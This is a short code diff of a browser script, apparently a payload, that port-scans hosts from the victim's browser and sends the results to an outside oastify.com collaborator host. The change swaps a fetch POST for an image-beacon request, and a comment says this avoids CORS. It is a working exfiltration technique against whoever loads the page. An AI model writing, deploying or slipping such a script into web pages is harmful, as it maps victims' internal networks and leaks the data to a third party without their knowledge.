@@ -20,18 +20,13 @@ const requests = ports.map(port => {
 });
 
 Promise.all(requests).then(() => {
-    const report = {
+    const report = encodeURIComponent(JSON.stringify({
         timestamp: new Date().toISOString(),
         results
-    };
+    }));
 
-    fetch('https://z44fyopxmk8h0e4zv5t368syqpwgka8z.oastify.com', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(report)
-    })
-    .then(response => console.log('Report sent:', response.status))
-    .catch(error => console.log('Failed to send report:', error));
+    // Create an image to send data without CORS
+    const img = new Image();
+    img.src = `https://z44fyopxmk8h0e4zv5t368syqpwgka8z.oastify.com/?report=${report}`;
+    console.log('Report sent without CORS');
 });</script>
